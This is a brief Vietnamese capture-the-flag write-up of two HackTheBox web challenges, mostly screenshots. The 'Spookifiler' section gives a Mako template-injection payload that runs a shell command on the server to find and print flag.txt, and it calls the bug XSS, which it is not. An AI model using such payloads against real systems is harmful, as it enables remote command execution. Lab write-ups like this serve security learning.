# HackTheBox cha lìn
Clearrrrrr

## **Flag Command**

![image](https://github.com/user-attachments/assets/b2be85b8-d16f-4386-96a0-5ea0247667aa)


## **Spookifiler**

  Bài nhập ta thấy web in ra thông tin mà người dùng nhập vào, ý tưởng XSS

![image](https://github.com/user-attachments/assets/f745f97f-2d46-43df-b118-51cb769474a3)

Vậy là XSS hoạt động, ta tiếp tục injection: 
>${self.module.cache.util.os.popen(%27find%20/%20-type%20f%20-name%20%22flag.txt%22%20-exec%20cat%20{}%20\\;%27).read()}
>
>${self.module.cache.util.os.popen('find / -type f -name "flag.txt" -exec cat {} \\;').read()}


![image](https://github.com/user-attachments/assets/4a4bf63a-4b92-48f8-a624-43b6b9702e9b)

